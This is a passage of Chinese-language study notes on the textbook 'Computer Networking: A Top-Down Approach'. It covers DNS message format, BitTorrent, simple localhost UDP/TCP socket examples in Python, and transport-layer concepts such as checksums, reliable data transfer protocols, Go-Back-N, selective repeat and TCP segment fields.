src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920163014665.png"></p><p>①前12字节为首部区域。标识符是一个用来标记该查询的16比特数。该标志符会被复制到相应的回答报文里，以便匹配请求和回答；</p><p>②标志字段有若干标志，用来指出报文的类型（请求还是响应）、查询类型（递归还是迭代）、是否是所请求名字的权威DNS服务器、以及4个有关数量的字段，用来指示4类数据区域出现的数量。</p><p>③问题区域包含了正在进行的查询信息，包括名字字段、查询类型。</p><p>④回答区域包含了对最初请求的名字的资源记录，回答报文回答区域可以包含多条RR，因此一个主机名能有多个IP地址。</p><p>⑤权威区域包含了其他权威服务器的信息。</p><p>⑥附加区域包含了其它有帮助的记录，比如在对于一个MX类型的请求回答报文里，回答区域里指出了邮件服务器的规范主机名，而附加区域里就有可能包含一个类型为A的关于该规范主机名的的IP地址。</p><h4 id="向DNS数据库中插入记录"><a href="#向DNS数据库中插入记录" class="headerlink" title="向DNS数据库中插入记录"></a>向DNS数据库中插入记录</h4><p>需要在注册登记机构完成这一任务，当你注册一个域名时，需要向该机构提供你的基本和辅助DNS服务器的名字和IP地址，该注册机构将确保一个类型为NS和类型为A的记录输入对应的顶级域名服务器，这样就完成了插入数据。</p><h2 id="P2P文件分发"><a href="#P2P文件分发" class="headerlink" title="P2P文件分发"></a>P2P文件分发</h2><p>有两种典型因特网应用十分适合P2P体系结构，一种是文件分发，另一种是大型对等方社区中的数据库；P2P体系结构有着良好的自扩展性；</p><p>BitTorrent 是一种用于文件分发的流行P2P协议；用BitTorrent的术语来说，参与一个特定文件分发的所有对等方的集合被称为一个洪流；在一个洪流中的对等方彼此下载等长度的文件块；当一个对等方下载文件块的时候，也向其他对等方发送了多个块；一旦某对等方获得了完整文件，就可以自私地离开洪流或者大公无私地留下来继续向其他对等方发送文件</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920163032533.png"></p><p>P2P的最小分发时间</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920163041945.png"></p><h2 id="套接字编程"><a href="#套接字编程" class="headerlink" title="套接字编程"></a>套接字编程</h2><h3 id="UDP套接字编程"><a href="#UDP套接字编程" class="headerlink" title="UDP套接字编程"></a>UDP套接字编程</h3><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920163100417.png"><strong><code>UDPClient.py</code></strong></p><pre class="line-numbers language-none"><code class="language-none">from socket import *serverName = "127.0.0.1"serverPort = 10021clientSocket = socket(AF_INET,SOCK_DGRAM)while True:message = raw_input('Input lowercase sentence:')if message=='quit':breakclientSocket.sendto(message,(serverName,serverPort))modifiedMessage,serverAddress = clientSocket.recvfrom(2048)print modifiedMessageclientSocket.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>UDPServer.py</code></strong></p><pre class="line-numbers language-none"><code class="language-none">from socket import *serverName = "127.0.0.1"serverPort = 10021serverSocket = socket(AF_INET,SOCK_DGRAM)serverSocket.bind((serverName,serverPort))print ("The server is ready to receive")while True:message,clientAddress = serverSocket.recvfrom(2048)modifiedMessage = message.upper()serverSocket.sendto(modifiedMessage,clientAddress)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="TCP套接字编程"><a href="#TCP套接字编程" class="headerlink" title="TCP套接字编程"></a>TCP套接字编程</h3><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920163128785.png"></p><p><strong><code>TCPClient.py</code></strong></p><pre class="line-numbers language-none"><code class="language-none">from socket import *serverName = "127.0.0.1"serverPort = 10021clientSocket = socket(AF_INET,SOCK_STREAM)clientSocket.connect((serverName,serverPort))while True:message = raw_input('Input lowercase sentence:')if message=='quit':breakclientSocket.send(message)modifiedMessage,serverAddress = clientSocket.recvfrom(2048)print modifiedMessageclientSocket.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>TCPServer.py</code></strong></p><pre class="line-numbers language-none"><code class="language-none">from socket import *serverName = "127.0.0.1"serverPort = 10021serverSocket = socket(AF_INET,SOCK_STREAM)serverSocket.bind((serverName,serverPort))serverSocket.listen(1)print ("The server is ready to receive")while True:connectionSocket,addr = serverSocket.accept()message = connectionSocket.recv(2048)modifiedMessage = message.upper()connectionSocket.send(modifiedMessage)connectionSocket.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、运输层"><a href="#三、运输层" class="headerlink" title="三、运输层"></a>三、运输层</h2><h2 id="概述和运输层服务"><a href="#概述和运输层服务" class="headerlink" title="概述和运输层服务"></a>概述和运输层服务</h2><p>传输层位于应用层和网络层之间，是分层的网络体系结构中重要的部分，该层为运行在不同主机上的应用进程提供直接的通信服务起着至关重要的作用</p><p>1.网络层提供了主机之间的逻辑通信，运输层为在不同主机上的进程之间提供了逻辑通信。</p><p>2.运输层协议只在主机起作用，运输层能够提供的服务受制于网络层协议的服务模型</p><p>3.网络应用可以使用多种传输层协议，因特网有两种传输层协议，即TCP和UDP，不同的传输层协议提供不同的运输层服务</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920163421589.png"></p><h3 id="运输层和网络层的关系"><a href="#运输层和网络层的关系" class="headerlink" title="运输层和网络层的关系"></a>运输层和网络层的关系</h3><p>1.网络层提供了**<code>主机</code>** 之间的逻辑通信。而运输层为运行在**<code>不同主机上的进程</code>** 提供逻辑通信。</p><p>2.运输层协议只工作在端系统上</p><p>3.运输协议能提供的服务受制于底层网络协议的服务模型，如果网络层协议无法为主机之间的通信提供时延和带宽保证的话，运输层协议也就无法为进程之间发送的应用程序报文提供时延或者带宽保证</p><p>4.网络层协议，即 IP 协议，其服务模型是 尽力而为交付服务 ，但不做任何的保证。是 不可靠服务</p><p><strong><code>解释运输层和网络层关系：</code></strong></p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920163435663.png"></p><ul><li><strong><code>运输层服务受制于网络层服务:</code></strong> （邮政大哥若三天来一次，Ann和Bill就不可能两天收发一次信）</li><li><strong><code>多种运输层协议，多种服务模型:</code></strong> （Ann 和 Bill 外出，Susan 和 Harvey来收信发信，结果年龄太小，收发邮件次数少，也老丢信）</li><li>**<code>运输层协议能为应用程序提供可靠数据传输服务:</code>**（若邮政大哥把信弄脏弄丢弄混，Ann 和 Bill 可以清理整理信件，或者让对方下次重新发一次）</li><li>**<code>运输层协议能确保应用程序报文不受入侵读取:</code>**（尽管邮政大哥可能被别人骗或者强行看了信件，Ann 和 Bill 也能规定加密方式对信的内容进行加解密，弟弟妹妹们只需要看信的内容）</li><li><strong><code>多路分解:</code></strong> Bill 和 Ann从邮递大哥拿到信件，看收信人名字（端口号），然后分别交到他们手上</li><li><strong><code>多路复用:</code></strong> Bill 和 Ann从弟弟妹妹手里拿到信件，帮他们装填信封写上信息</li></ul><h3 id="因特网运输层概述"><a href="#因特网运输层概述" class="headerlink" title="因特网运输层概述"></a>因特网运输层概述</h3><p>1.UDP（用户数据报协议） 提供了一种不可靠、无连接的服务。</p><p>2.TCP（传输控制协议） 提供了一种可靠的、面向连接的服务。</p><p>3.进程到进程的数据交付和差错检测是两种最低限度的运输层服务，也是 UDP 能提供的仅有的两种服务</p><p>4.运输层分组也被称为报文段</p><p>5.UDP和TCP最基本的责任就是将IP提供的主机间交付服务扩展到不同端系统上两个个进程之间的服务。这也被称为传输层的多路分解和多路复用</p><h2 id="多路复用和多路复解"><a href="#多路复用和多路复解" class="headerlink" title="多路复用和多路复解"></a>多路复用和多路复解</h2><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920163454154.png"></p><p><strong><code>多路分解：</code></strong> 将运输层报文段中的数据交付到正确的套接字。</p><p><strong><code>多路复用：</code></strong> 在源主机从不同的套接字中收集数据块，并为每个数据块封装上首部信息从而生成报文段，然后将报文传递到网络层。</p><p><strong>运输层多路复用要求：</strong></p><p>①套接字有唯一标识符。</p><p>②每个报文段有特殊字符（端口号）来指示该报文段所要交付到的套接字。</p><p><strong><code>端口号：</code></strong> 一个 16 比特的数，在 0 ~ 65535 之间。其中 0 ~ 1023 是周知端口号，是受限制的。</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920163507636.png"></p><h3 id="无连接的多路复用和多路分解："><a href="#无连接的多路复用和多路分解：" class="headerlink" title="无连接的多路复用和多路分解："></a>无连接的多路复用和多路分解：</h3><p><strong><code>创建UDP套接字：</code></strong></p><p>①用 <code>clientSocket = socket(socket.AF_INET, socket.SOCK_DGRAM)</code>创建一个 UDP 套接字时，系统会自动为该套接字分配一个未被其他 UDP 套接字使用的端口号。</p><p>②用<code>clientSocket.bind(('',23333))</code> 显式的分配一个端口号。</p><p>通常，应用程序的客户端让运输层自动地分配端口号，而服务器则分配一个特定的端口号</p><p>一个 UDP 套接字由（目的IP地址，目的端口号）标识。注意是用来标识，不是只有这两个相关字段，还有源端口号、源IP地址字段。源端口号和目的端口号按传递方向反转![image-20250920163531283](《计算机网络自顶向下方法》读书笔记/image-20250920163531283.png</p><h3 id="面向连接的多路复用和多路分解"><a href="#面向连接的多路复用和多路分解" class="headerlink" title="面向连接的多路复用和多路分解"></a>面向连接的多路复用和多路分解</h3><p>TCP 套接字是由一个四元组（源 IP 地址，源端口号，目的 IP 地址，目的端口号）来标识的</p><p>TCP服务器在12000端口listen，TCP客户创建一个套接字并发送一个连接建立请求报文段，当服务器接收到该请求时，服务器会定位12000端口等待的进程并为其创建一个套接字，用[源IP，源端口，目的IP，目的端口]来标识，则可以建立与源端口的连接。服务器主机可以支持很多并行的TCP套接字，每个套接字与一个进程连接，从而提供并行的服务。当今高性能的服务器通常只有一个进程，而是为每个新客户连接创建一个具有新套接字的线程。</p><h2 id="无连接运输UDP"><a href="#无连接运输UDP" class="headerlink" title="无连接运输UDP"></a>无连接运输UDP</h2><p><strong><code>选择UDP的原因：</code></strong></p><p><strong><code>①关于何时、发送什么数据的应用层控制更为精细。</code></strong></p><p><strong><code>②UDP无需建立连接。</code></strong> TCP数据传输之前会经过三次握手，UDP不需要准备就能传输数据，UDP不会引入建立连接的时延</p><p><strong><code>③无连接状态。</code></strong> TCP需要在端系统维护连接状态</p><p><strong><code>④分组首部开销小。</code></strong> 只有8个字节，比TCP的20个字节的首部要短</p><ul><li>UDP支持一对一、一对多、多对一、多对多的交互通信</li><li>UDP没有拥塞控制，对于实时应用很有效。</li><li>UDP是面向报文的，对应用程序交下来的报文，在添加首部之后直接交付给IP层。应用层交给UDP多长的报文，UDP就照样发送，即一次发送一个报文</li><li>UDP使用最大努力交付，不保证可靠交付。</li></ul><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920163822787.png">、</p><h3 id="UDP报文段结构"><a href="#UDP报文段结构" class="headerlink" title="UDP报文段结构"></a>UDP报文段结构</h3><ul><li>UDP首部只有4个字段，每个字段占用两个字节，分别是：源端口号、目的端口号、长度和校验和</li><li>长度表示包含首部在内的UDP报文段长度，以字节为单位</li></ul><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920174748505.png"></p><h3 id="UDP检验和"><a href="#UDP检验和" class="headerlink" title="UDP检验和"></a>UDP检验和</h3><p>IP数据报的检验和只检验IP数据报的首部，但是UDP的检验和是把首部和数据部分一起都检验。</p><p><strong><code>检验方法：</code></strong></p><p>①将 UDP 报文按 16 比特进行分组。</p><p>②将两个 16 比特的数字相加得到一个 32 位的数。</p><p>③将 2 中得到的 32 比特数的 高 16 位和低 16 相加。</p><p>④重复第 2 步直到得到的和的高 16 位为 0。</p><p>⑤将得到的 16 比特的数按位取反即为 检验和。</p><p>注：计算之前的检验和为 0</p><p>如果传输没有出错，则在接收方处计算的的检验和将是 11111111111111。若不是，则数据有错。<img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920163849402.png"></p><h2 id="可靠数据传输原理"><a href="#可靠数据传输原理" class="headerlink" title="可靠数据传输原理"></a>可靠数据传输原理</h2><blockquote><p>可靠数据传输协议（reliable data transfer protocol）。由于可靠数据传输协议的下层协议也许是不可靠的，因此这是一项困难的任务。<br>单向数据传输（unidirectional data transfer）即数据传输是从发送端到接收端的。</p></blockquote><p>双向数据传输（bidirectional data transfer）（即全双工数据传输）</p><p>可靠数据传输协议往往建立在不可靠IP网络层协议之上。</p><p>TCP发送的报文段是交给IP层传送的。但IP层只能提供尽最大努力服务，也就是说TCP下面的网络所提供的是不可靠的传输。因此，TCP必须采用适当的措施才能使得两个传输层之间的通信变得可靠。</p><p>可靠数据传输为上层实体提供的服务抽象是：数据可以通过一套可靠的信道进行传输，借助于可靠信道，传输数据就不会受到损坏或者丢失；并且所有数据都可以按照其发送顺序进行交付。而这正是TCP向调用它的应用所提供的服务模型</p><p>单方向的可靠数据传输流程大概是这样的：可靠数据传输-&gt;不可靠数据传输-&gt;不可靠的传输信道-&gt;可靠数据接收-&gt;上传Data<img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920163904083.png"></p><h3 id="构造可靠数据传输协议"><a href="#构造可靠数据传输协议" class="headerlink" title="构造可靠数据传输协议"></a>构造可靠数据传输协议</h3><h4 id="经完全可靠信道的可靠数据传输：rdt1-0"><a href="#经完全可靠信道的可靠数据传输：rdt1-0" class="headerlink" title="经完全可靠信道的可靠数据传输：rdt1.0"></a>经完全可靠信道的可靠数据传输：<strong>rdt1.0</strong></h4><p>底层信号完全可靠，然而这在实际中不能实现</p><p><strong><code>有限状态机（FSM）：</code></strong></p><p>箭头指示了协议从一个状态变迁到另一个状态</p><p>引起变迁的事件显示在横线的上方。</p><p>事件发生时所采取的动作显示在横线的下方。</p><p>^ 表示什么都不做。</p><p>FSM初始状态用虚线表示</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920163917081.png"></p><p>发送方：</p><p>rdt_send(data): 接收较高层的数据。</p><p>make_pkt(data): 将数据打包成分组。</p><p>udt_send(packet): 将分组发送到信道中。</p><p>接收方：</p><p>rdt_rcv(data): 从底层信道接收一个分组。</p><p>extract(packet,data): 从分组中取出数据。</p><p>deliver_data(data): 将数据传送给较高层</p><h4 id="经具有比特差错信道的可靠数据传输：rdt-2-0"><a href="#经具有比特差错信道的可靠数据传输：rdt-2-0" class="headerlink" title="经具有比特差错信道的可靠数据传输：rdt 2.0"></a>经具有比特差错信道的可靠数据传输：<strong>rdt 2.0</strong></h4><p>底层信道传输的数据可能会有比特差错。但是仍然不会丢包<br>自动重传请求协议（ARQ）当发送方处于等待 ACK 或 NAK 的状态时，它不能从上层获得数据</p><p><strong><code>三种协议功能来处理存在比特差错的情况</code></strong></p><p><strong><code>差错检测</code></strong></p><p><strong><code>接收方反馈</code></strong></p><p>肯定确认（ACK）</p><p>否定确认（NAK）</p><p><strong><code>重传</code></strong></p><p>接收到有差错的分组时，发送方重传该分组。</p><h4 id="停等协议"><a href="#停等协议" class="headerlink" title="停等协议"></a>停等协议</h4><p>所谓停等协议是指发送方发送完分组A后，需要等待接收方对分组A的反馈分组，如果收到肯定分组，那么就发送下一个分组；如果收到否定分组，那么就重新发送当前分组；值得注意的是，有些协议中只有肯定分组，肯定分组包含一个分组号K，表示标号为K的分组已经收到，发送方可以发送标号为K+1的分组；如果发送方此时等待的正好是对K的确认分组，那么发送方就会发送标号为K+1的分组；如果发送方接收到对K-1的确认，表示接收方并没有收到编号为K的分组，需要重发；另外，停等协议中只需要一个定时器用来监听超时事件<br>简单来说，停等协议就是要等到上一个分组得到正确接收的确认后才能处理下一个分组。它存在一个致命的缺陷。尤其是我们没有考虑到ACK或NAK分组受损的可能性。</p><pre class="line-numbers language-none"><code class="language-none">考虑处理受损ACK和NAK的3种可能性    第一种：接收方对受损的ACK或NAK继续做错误反馈，由于发出的错误反馈可能再次受损，这样就有可能进入死循环。    第二种：增加足够的检验和比特，使发送方不仅可以检测差错，还可以恢复差错。对于会产生差错但不丢失分组的信道，这就可以直接解决问题。    第三种：当接收方收到含糊不清的ACK或NAK分组时，只需重传当前数据分组即可。这种方法在发送方到接收方的信道中引入了冗余分组（duplicate packet）。冗余分组的根本困难在于接收方不知道他上次所发送的ACK或NAK是否被发送方正确的收到。因此他无法事先知道接收到的分组是新的还是一次重传。    对于第三种情况，解决这个新问题的的简单方法是在数据分组中添加一新字段，让发送方对其数据分组编号，即将发送数据分组的序号（sequence number）放在该字段。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="经具有比特差错的丢包信道的可靠数据传输：-rdt3-0-（比特交替协议）"><a href="#经具有比特差错的丢包信道的可靠数据传输：-rdt3-0-（比特交替协议）" class="headerlink" title="经具有比特差错的丢包信道的可靠数据传输：**rdt3.0**（比特交替协议）"></a>经具有比特差错的丢包信道的可靠数据传输：**<code>rdt3.0</code>**（比特交替协议）</h4><ul><li>发送方负责检测和回复丢包工作，对每一个分组维护一个定时器。如果在一个时间段内没收到ACK，则判定为丢包，重传分组，这也引入了冗余数据分组的可能性（时延很大的情况）</li><li>检测丢包的方法：倒计数定时器用于实现基于时间的重传机制</li><li>总结可靠传输需要的技术：检验和、序号、定时器、肯定和否定确认分组</li></ul><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920163957571.png"></p><h3 id="流水线可靠数据传输协议"><a href="#流水线可靠数据传输协议" class="headerlink" title="流水线可靠数据传输协议"></a>流水线可靠数据传输协议</h3><p>dt 3.0 是一个功能正确的协议，但是由于它是一个停等协议，大部分的时间都浪费在等待确认上面，所以性能不好。</p><p>解决这种特殊性能问题的一个简单的方法是：不使用停等方式运行，允许发送方发送多个分组而无需等待确认。这种技术被称为 流水线。<br>要使用流水线技术，则须：</p><p>①增加序号范围。因为要传送多个分组，而每个传输中的分组必须有一个单独的序号。</p><p>②协议的发送方和接收方两端必须能缓存多个分组。发送方至少得能缓存那些已发送但未确认的分组，而接收方或许也需要缓存那些已经正确接收的分组。<br>所需序号的范围和对缓冲的要求取决于数据传输协议如何处理丢失、损坏及延时过大的分组。</p><p>③流水线的差错恢复有两种基本方法：</p><p>回退 N 步</p><p>选择重传<img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164015200.png"></p><h3 id="回退n步"><a href="#回退n步" class="headerlink" title="回退n步"></a>回退n步</h3><p>回退N步（GBN）：允许发送端发送多个分组，但在流水线中未被确认的分组数不能大于N，N被称为窗口长度，GBN协议也被称为滑动窗口协议。如果出现超时，发送方会重传所有已发送但未被确认的分组，即回退N步，从而保证接收端可以按序将数据交付给上层。</p><ul><li>基序号（base）为最早的未确认分组的序号。</li><li>下一个序号（nextseqnum）为下一个待发分组的的序号。</li><li>N 常被称为 窗口长度，GBN 协议也常被称为 滑动窗口协议。</li><li>GBN 的发送方必须响应三种类型的事件：</li></ul><p>①上层的调用：若窗口未满，则产生一个分组将其发送</p><p>②收到一个 ACK：对序号为 n 的分组的确认采取 累积确认，表明接收方已正确接收到包括 n 的序号在内的 n 的以前的所有分组</p><p>③超时事件：只使用一个定时器，即最早的已发送但未被确认的分组所使用的定时器。如果出现超时，则发送方重传所有已发送但还未被确认的分组。如果收到一个 ACK，但仍有已发送但未被确认的分组，则重启定时器。如果没有已发送但未确认的分组，该定时器被终止</p><p><strong><code>GBN正常传输：</code></strong></p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164057607.png"></p><p><strong><code>GBN丢失帧</code></strong></p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164108765.png"></p><h2 id="选择重传"><a href="#选择重传" class="headerlink" title="选择重传"></a>选择重传</h2><p>选择重传（SR）：GBN中单个分组的错误会引起重传大量分组。选择重传协议通过让发送端仅重传那些它怀疑在接收方出错的分组。</p><p><strong><code>发送方需要响应的时间有三个</code>：</strong></p><ul><li>上层调用：基本上同GBN一致；</li><li>收到ACK：如果该分组号在base-next sequence-1之间，将其标记为已到；如果等于base，则移动窗口到最下的待确认的分组序号处；在GBN中，接收方根本不会收到非base的ACK，但是怎么收，还的看怎么发；</li><li>超时事件：同GBN不一样的是，选择重传需要为每一个分组建立一个定时器，如果某个已发送但未被确认的分组超时，发送方重发该分组；</li></ul><p><strong><code>SR 接收方的事件与动作：</code></strong></p><ul><li><p>序号在 [rcv_base, rcv_base + N -1] 内的分组被正确接收：在此情况下，收到的分组落在接收方的窗口内，一个选择 ACK 被回送给发送方。如果该分组以前没收到过，则缓存该分组。如果该分组的序号等于接收窗口的基序号，则该分组及以前缓存的序号连续的分组交付给上层。</p></li><li><p>序号在 [rcv_base - N, rcv_base - 1] 内的分组被正确接收： 产生一个 ACK，即使该分组是接收方以前已确认过的分组。</p></li><li><p>其他情况：忽略该分组。</p></li></ul><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164124483.png"></p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164133582.png"></p><h2 id="面向连接的运输TCP"><a href="#面向连接的运输TCP" class="headerlink" title="面向连接的运输TCP"></a>面向连接的运输TCP</h2><p>TCP是因特网运输层的面向连接的可靠的运输协议</p><ul><li>TCP是面向连接的</li></ul><p>通信前需要建立连接，通信结束需要释放连接。</p><ul><li>TCP提供全双工通信</li></ul><p>TCP的两端既可以作为发送端，也可以作为接收端</p><ul><li>TCP提供可靠交付服务</li></ul><p>TCP发送的数据无重复、无丢失、无错误、与发送端顺序一致。</p><ul><li>TCP是面向字节流的</li></ul><p>TCP以字节为单位。虽然传输的过程中数据被划分成一个个数据报，但这只是为了方便传输，接收端最终接受到的数据将与发送端的数据一模一样。</p><ul><li>一条TCP连接的两端只能有两个端点</li></ul><p>TCP只能提供点到点的通信，而UDP可以任意方式的通信。</p><h3 id="TCP连接"><a href="#TCP连接" class="headerlink" title="TCP连接"></a>TCP连接</h3><ul><li>由于 TCP 协议只在端系统中运行，而不在中间的网络元素（路由器和链路层交换机）中运行，所以中间的网络元素不会维持 TCP 连接状态，不会为该连接分配任何缓存和变量。其连接状态完全保留在两个端系统中。</li><li>TCP 建立连接需要 三次握手，其中，前两次握手不承载”有效荷载“，第三次握手可以承载有效荷载。</li><li>通过套接字发送数据、</li></ul><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164201535.png"></p><ul><li>TCP 将数据引导到该连接的 发送缓存 里，接下来 TCP 就会不时地从发送缓存里取出一块数据。</li><li>TCP 可从缓存中取出并放入报文段的数据数量受限于 最大报文段长度（MSS）。该长度是指报文段里应用层数据的最大长度，而不是包括 TCP 首部的 TCP 报文段的最大长度</li></ul><h3 id="TCP报文段结构"><a href="#TCP报文段结构" class="headerlink" title="TCP报文段结构"></a>TCP报文段结构</h3><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920164215432.png"></p><ul><li>16 比特的 <strong><code>源端口号</code></strong> 和 16 比特的目的 <strong><code>端口号</code></strong> 。用于多路分解和多路复用。</li><li>32 比特的 <strong><code>序号（sequence number）</code></strong> 字段。 <strong><code>一个报文段的序号</code></strong> 是该报文段数据字段首字节的序号。</li><li>32 比特的 <strong><code>确认号（Acknowledgement number）</code></strong> 字段。主机 A　填充进报文段的确认号是**<code>主机 A 期望从主机 B 收到的下一字节的序号</code>**</li><li>16 比特的 <strong><code>接收窗口（Receive window）</code></strong> 字段。用于指示接收方愿意接收的字节数量。</li><li>4 比特的 <strong><code>首部长度（header length）</code></strong> 字段。指示了以 32 比特的字为单位的 TCP 首部长度。</li></ul><p>可变与变长的 <strong><code>选项（options）</code></strong> 字段。用于发送方与接收方协商最大报文段长度时，或在高速网络环境下作用窗口调节因子时使用。</p><ul><li>6 比特的 <strong><code>标志（flag）</code></strong> 字段。<br>ACK 是对成功接收一个报文段的确认。<br>RST、SYN 和 FIN 用于连接的建立和拆除。<br>PSH 被设置时，指示接收方应立即将数据交给上层。<br>URG 比特用来指示报文段里存在着被发送端上层实体置为“紧急”的数据。紧急的最后一个字节由 16 比特的 